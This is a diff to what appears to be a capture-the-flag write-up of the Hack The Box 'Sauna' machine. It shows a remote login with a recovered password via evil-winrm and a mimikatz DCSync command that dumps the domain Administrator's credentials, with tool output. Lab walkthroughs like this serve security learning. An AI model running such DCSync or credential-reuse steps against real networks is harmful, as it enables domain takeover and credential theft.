@@ -177,31 +177,13 @@ We see the password is `Moneymakestheworldgoround!` and we can use it to login t
 evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
-After we are logged in we can try running [mimikatz](https://github.com/gentilkiwi/mimikatz) with the command of:
+In this case `svc_loanmgr` user has `DS-Replication-Get-Changes-All` privilege (found with BloodHound) so that means we can perform a DCSync attack, and tool that we can use is [mimikatz](https://github.com/gentilkiwi/mimikatz). So we need to transfer [mimikatz](https://github.com/gentilkiwi/mimikatz) to the box the same way we did with winPeas script. After we have it on the box we can run the following command:
 
 ```
 .\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
 ```
-
-But to run it we first need to transfer it and we do that just like we did winPeas. After running the mimikatz command we can see the following output:
-
+After running the command we get the output:
 ```
-  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
-
-mimikatz(commandline) # lsadump::dcsync
-[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
-[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
-ERROR kuhl_m_lsadump_dcsync ; Missing user or guid argument
-
-mimikatz(commandline) # exit
-Bye!
-*Evil-WinRM* PS C:\Temp> .\mimi.exe "lsadump::dcsync /user:Administrator" "exit"
-
   .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
